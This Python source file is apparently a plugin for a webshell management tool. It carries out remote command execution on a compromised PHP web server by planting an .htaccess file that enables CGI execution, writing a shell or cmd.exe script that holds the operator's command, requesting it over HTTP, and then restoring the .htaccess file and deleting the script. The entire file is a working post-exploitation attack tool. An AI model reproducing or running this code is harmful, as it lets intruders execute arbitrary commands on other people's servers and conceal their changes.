import argparse, os, json, base64
from typing import Union
from api import  Plugin, Command, CommandExecutor, CommandReturnCode,  Cmdline, CommandType, SessionType, Session, logger, tablor, utils
from api import OSType
import requests
from urllib.parse import urljoin

def get_plugin_class():
    return HTAccessExecPlugin

class HTAccessExecPlugin(Plugin, Command, CommandExecutor):
    name = ".htaccess执行系统命令"
    description = "使用.htaccess执行系统命令，一般需要web容器（如；Apache）支持，且需要开启选项`AllowOverride All`"
    command_name = 'exec_by_htaccess'
    command_type = CommandType.SYSTEM_COMMAND
    supported_session_types = [SessionType.PHP]

    def __init__(self):
        super().__init__()
        self.parse = argparse.ArgumentParser(prog=self.command_name, description=self.description)
        self.parse.add_argument('cmd', help="要执行的系统命令", nargs='?')

        self.parse.add_argument('-s', '--show-config', help="显示当前配置信息", action='store_true')
        self.parse.add_argument('-d', '--htaccess-dir', help="要生成.htaccess文件的目录(网站绝对路径)，默认在网站根目录")
        self.parse.add_argument('-c', '--cmd-dir', help="要生成命令文件的目录(网站绝对路径)，置空时则总是和.htaccess文件同目录（默认）")
        self.parse.add_argument('-t', '--type', help="指定容器是通过什么方式启动的，默认CGI方式", choices=['CGI', 'FastCGI'])
        self.parse.add_argument('-v', '--verbose', help="是否显示命令执行过程", choices=['on', 'off'])

        self.help_info = self.parse.format_help()

        self.htaccess_dir = '/' # 远程.htaccess文件所在目录(网站绝对路径)
        self.cmd_dir = '' # 远程命令文件所在目录(网站绝对路径)
        self.start_type = 'CGI' # web容器启动方式
        self.verbose = False # 是否显示命令执行过程

    def on_loading(self, session: Session) -> bool:
        return super().on_loading(session)

    
    def exec(self, cmd: bytes, timeout: float) -> Union[bytes, None]:
        cmd_dir = self.cmd_dir
        if not cmd_dir:
            cmd_dir =  self.htaccess_dir
        suffix = utils.random_str()
        old_htaccess_content = b''
        cmd_interpreter = 'C:/Windows/System32/cmd.exe /c' if self.session.server_info.os_type == OSType.WINDOWS else '/bin/sh'
        cmd_path = cmd_dir+'/'+utils.random_str()+'.'+suffix
        cmd_data = r'''
        #!%s
        echo "Content-Type: text/html"
        %s
        %s
        '''%(cmd_interpreter, "echo.\necho." if self.session.server_info.os_type == OSType.WINDOWS else 'echo -e "\n\n"', cmd.decode())
        htaccess_content = r'''
        Options ExecCGI
        AddHandler cgi-script .%s
        '''%suffix
        if self.start_type == 'FastCGI':
            htaccess_content = r'''
            Options +ExecCGI
            AddHandler fcgid-script .xx
            FcgidWrapper "%s" .%s
            '''%(cmd_interpreter, suffix)

        # 新增或改写.htaccess文件,并在成功时写入命令文件
        sep = self.session.server_info.sep
        htdir = self.session.server_info.www_root+sep+self.htaccess_dir.replace('/', sep).lstrip(sep)
        cmdpath = self.session.server_info.www_root+sep+cmd_path.replace('/', sep).lstrip(sep)
        ret = self.session.evalfile('do_file', dict(htdata=htaccess_content, 
            htdir=htdir, htcover=False, 
            cmdpath=cmdpath, cmddata=cmd_data), timeout, True)
        if ret is None:
            return None
        ret = json.loads(ret)
        code = ret['code']

        if code == -1:
            if self.verbose:
                logger.error(f"`{htdir}`目录下.htaccess文件已存在，但不可读！！")
            return None
        elif code == -2:
            if self.verbose:
                logger.error(f"`{htdir}`目录下.htaccess文件已存在，但不可写！！")
            return None
        elif code == -3:
            if self.verbose:
                logger.error(f"`{htdir}`目录下.htaccess文件不存在！但该目录无法创建文件！！")
            return None
        elif code == -4:
            if self.verbose:
                logger.error(f"`{cmdpath}`命令文件无法写入，该目录下无写入权限！！")
            return None
        elif code == 0:
            if self.verbose:
                logger.error(f"`{self.htaccess_dir}`目录下.htaccess文件创建成功！！")
        elif code == 1:
            old_htaccess_content = base64.b64decode(ret['msg'].encode()) #保存原始数据
            if self.verbose:
                logger.error(f"`{self.htaccess_dir}`目录下.htaccess文件已存在，并添加配置成功！！")

        # 访问命令文件并执行命令
        ret = requests.get(urljoin(self.session.server_info.website, cmd_path), verify=False)
        result = ret.content

        # 清理
        self.session.evalfile('close', dict(htdir=htdir, htdata=old_htaccess_content, cmdpath=cmdpath), 
            self.session.options.get_option('timeout').value, True)
        
        return result

    def exec_command(self, cmd:str)->CommandReturnCode:
        ret = self.exec(cmd.encode(), self.session.options.get_option('timeout').value)
        if ret is None:
            logger.error(f"执行命令`{cmd}`失败！")
            return CommandReturnCode.FAIL
        print(ret.decode(self.session.options.get_option('encoding').value, errors='ignore'))
        return CommandReturnCode.SUCCESS

    def run(self, cmdline: Cmdline) -> CommandReturnCode:
        args = self.parse.parse_args(cmdline.options)
        if args.htaccess_dir:
            self.htaccess_path = args.htaccess_dir.rstrip('/')
            logger.info(f"htaccess_dir => {self.htaccess_dir}")
        
        if args.type:
            self.start_type =  args.type
            logger.info(f"start_type => {self.start_type}")

        if args.verbose:
            self.verbose = True if args.verbose == 'on' else False
            logger.info(f"verbose => {args.verbose}")

        if args.cmd_dir:
            self.cmd_dir = args.cmd_dir.rstrip('/')
            logger.info(f"cmd_dir => {args.cmd_dir}")

        if args.show_config:
            # 显示配置信息
            table = [
                ['.htaccess文件所在目录', self.htaccess_dir],
                ['apache启动方式', self.start_type],
                ['显示命令执行过程', self.verbose],
                ['命令文件所在目录', self.cmd_dir if self.cmd_dir else "跟随.htaccess文件"]
            ]
            print(tablor(table, False, True))
        elif args.cmd:
            return self.exec_command(args.cmd)

        return CommandReturnCode.SUCCESS